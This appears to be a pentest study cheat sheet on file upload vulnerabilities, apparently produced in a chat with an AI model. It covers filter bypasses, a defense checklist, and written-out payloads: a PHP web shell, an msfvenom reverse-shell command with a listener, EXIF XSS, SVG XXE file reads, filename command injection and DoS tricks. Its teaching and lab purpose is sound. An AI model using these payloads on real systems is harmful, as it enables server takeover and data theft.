

---

# 📤 File Upload Vulnerabilities

> [!info] What is File Upload?
> 
> File upload features allow users to store data on a web server (e.g., profile pictures, documents). If not properly validated, attackers can upload malicious scripts (web shells) to achieve Remote Code Execution (RCE) or weaponize "safe" files for secondary attacks.

**Common Contexts**

- Profile Image Uploads
- Document/Resume Submissions
- Corporate File Managers
- Avatar/Attachment Forms

---

# 🎯 Quick Enumeration Workflow

```text
Find Upload Feature?
   ↓
Identify Tech Stack (Wappalyzer / Fuzz extensions)
   ↓
Test Basic Upload (e.g., test.php with "Hello HTB")
   ↓
Blocked? Check Validation Type:
   ├─ Client-Side? → Bypass via DevTools or Burp
   ├─ Blacklist? → Fuzz alternative extensions (.phtml, .php5)
   ├─ Whitelist? → Try Double Extensions or Null Bytes
   └─ Content Check? → Spoof Content-Type & add Magic Bytes
   ↓
Upload Payload (Web Shell or Reverse Shell)
   ↓
Locate File (Check response, force errors, or guess path)
   ↓
Execute & Escalate!
```

---

# 📂 Important File Types & Payloads

|Extension / Type|Purpose / Attack Vector|
|---|---|
|`.php`, `.phtml`, `.php5`|Direct PHP Code Execution|
|`.svg`|XML-based; perfect for Stored XSS or XXE|
|`.jpg` / `.png`|Used for Magic Byte spoofing or EXIF injection|
|`.zip`|Decompression bombs (DoS)|
|`shell.php%00.jpg`|Null Byte Injection (truncates filename on older PHP)|

---

# 🔍 Initial Enumeration

## Identify the Tech Stack
Don't guess the language; verify it.

**Manual Fuzzing:**
```bash
# Test if index pages reveal the language
http://<IP>/index.php
http://<IP>/index.aspx
```

**Automated (Wappalyzer / Burp):**
- Browser Extension: Wappalyzer (shows Apache, PHP, Ubuntu, etc.)
- Burp Suite: Send a request to Intruder and fuzz the extension.

---

# 🛡️ Bypass Techniques

## 1. Client-Side Validation
*Flaw: Validation happens in the browser (JavaScript).*
- **DevTools:** Inspect element, delete `onchange="checkFile()"` and `accept=".jpg,.png"`.
- **Burp Suite:** Upload a valid `.jpg`, intercept the request, and change `filename="shell.jpg"` to `filename="shell.php"`.

## 2. Blacklist Filters
*Flaw: Incomplete list of blocked extensions.*
- **Fuzz Extensions:** Use Burp Intruder with SecLists (`/Discovery/Web-Content/web-all-content-types.txt` or PHP extension lists).
- **Common Bypasses:** `.phtml`, `.php3`, `.php4`, `.php5`, `.phps`, `.pHp` (case sensitivity).

## 3. Whitelist Filters
*Flaw: Regex checks if extension *exists*, not if it *ends* the string.*
- **Double Extension:** `shell.jpg.php` (App sees `.jpg`, Server executes `.php`).
- **Reverse Double Extension:** `shell.php.jpg` (App allows `.jpg`, Apache misconfiguration executes `.php` if it *contains* `.php`).
- **Null Byte Injection:** `shell.php%00.jpg` (Older PHP truncates the string at `%00`, saving as `shell.php`).

## 4. Content / MIME Validation
*Flaw: Server checks file content or headers, but can be spoofed.*
- **Spoof Header:** Change `Content-Type: application/x-php` to `Content-Type: image/jpeg` in Burp.
- **Magic Bytes (Polyglot):** Add `GIF8` to the very first line of your PHP script. The server's `mime_content_type()` reads it as a GIF, but the PHP engine still executes the code below it.

---

# 🐚 Web Shells & Reverse Shells

## Custom PHP Web Shell
Simple, reliable, and easy to memorize.
```php
<?php system($_REQUEST['cmd']); ?>
```
**Usage:** `http://<IP>/uploads/shell.php?cmd=id`
> [!tip] Pro Tip
> Press `Ctrl+U` (View Page Source) in the browser to see clean terminal output without HTML formatting messing up the display.

## Custom Reverse Shell (Msfvenom)
Preferred for interactive control.
```bash
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f raw > reverse.php
```
**Listener:**
```bash
nc -lvnp <YOUR_PORT>
```

---

# 🎭 Limited Upload Attacks (When RCE is Blocked)

If you can *only* upload "safe" files (images, PDFs), pivot to these attacks:

### Stored XSS via Metadata
Inject payload into EXIF data. If the site displays image info, it triggers.
```bash
exiftool -Comment='"><img src=1 onerror=alert(document.domain)>' HTB.jpg
```

### XXE via SVG
SVGs are XML. Upload a malicious SVG to read server files.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
*(Decode the Base64 output to read the source code and find hidden credentials or upload logic).*

### Denial of Service (DoS)
- **Decompression Bomb:** Upload a tiny `.zip` that expands to petabytes.
- **Pixel Flood:** Modify a JPG header to claim a massive resolution (e.g., 65535x65535), exhausting server RAM when it tries to render it.

---

# 🧨 Advanced & Edge-Case Attacks

- **Filename Injection:** Name file `shell.jpg; whoami` or `<script>alert(1)</script>.jpg`. If the app uses the filename in OS commands, HTML, or SQL queries unsafely, it triggers injection.
- **Directory Disclosure:** Force errors by uploading duplicate filenames, 5000-character filenames, or using Windows reserved names (`CON`, `NUL`) to reveal the absolute upload path.
- **Windows 8.3 Naming:** Use `WEB~1.CON` to potentially overwrite critical system files like `web.config` on Windows servers.

---

# 🛡️ Remediation / Defense Checklist

Provide these action points in your pentest reports:

1. **Strict Validation:** Use a combination of **Whitelisting** (check end of string with `$`) AND **Blacklisting**.
2. **Content Verification:** Validate both the `Content-Type` header AND the file's Magic Bytes (MIME type), ensuring they match the extension.
3. **Rename Files:** Never use the user-provided filename. Rename uploads to random UUIDs (e.g., `a1b2c3d4-e5f6.jpg`) and store the original name in a database.
4. **Isolate Storage:** Store uploads outside the web root or on a separate server/container (e.g., AWS S3).
5. **Secure Delivery:** Serve files via a proxy script (`download.php`) that enforces authorization, prevents LFI/IDOR, and sets strict headers:
   - `Content-Disposition: attachment` (Forces download, prevents inline rendering/XSS).
   - `X-Content-Type-Options: nosniff` (Prevents MIME-sniffing).
6. **Harden the Server:** Disable dangerous PHP functions (`exec`, `system`, `shell_exec`) via `disable_functions` in `php.ini`, and turn off detailed error reporting.

---

# 🧠 Exam Mental Model

```text
File Upload Found
 ├─ Tech Stack Identified? (Wappalyzer / Fuzz)
 │   └─ Yes → Match payload to language (PHP, ASPX, etc.)
 │
 ├─ Client-Side Only?
 │   └─ Bypass via DevTools or Burp Intercept
 │
 ├─ Server-Side Extension Check?
 │   ├─ Blacklist → Fuzz alternative extensions (.phtml, .php5)
 │   └─ Whitelist → Double extension (.jpg.php) or Null Byte (.php%00.jpg)
 │
 ├─ Content/MIME Check?
 │   └─ Spoof Content-Type header + Add "GIF8" Magic Bytes to top of file
 │
 ├─ Still Blocked? (Limited Upload)
 │   ├─ Try SVG XXE to read source code
 │   ├─ Try EXIF XSS
 │   └─ Force errors to find upload directory path
 │
 └─ Success?
     ├─ Web Shell (?cmd=id)
     └─ Reverse Shell (nc listener)
```

> [!success] File Upload Rule of Thumb
> 
> **Whenever you see a file upload feature, immediately think:**
> 
> ```text
> 1. Can I upload a .php file directly?
> 2. If not, what is the filter? (Client, Blacklist, Whitelist, Content)
> 3. Can I spoof the extension AND the content (GIF8)?
> 4. If strictly images, can I weaponize an SVG (XXE/XSS)?
> ```
> 
> Always start with a simple `<?php echo "Hello HTB"; ?>` test to prove execution before deploying complex reverse shells. Defense in depth means you must bypass *all* layers (Extension + Content + Execution) to win.

---

How does this look? It captures every single technique, payload, and remediation step we discussed today, formatted perfectly for quick scanning during a hack. Let me know if you want to tweak any section or if you're ready for the next topic!
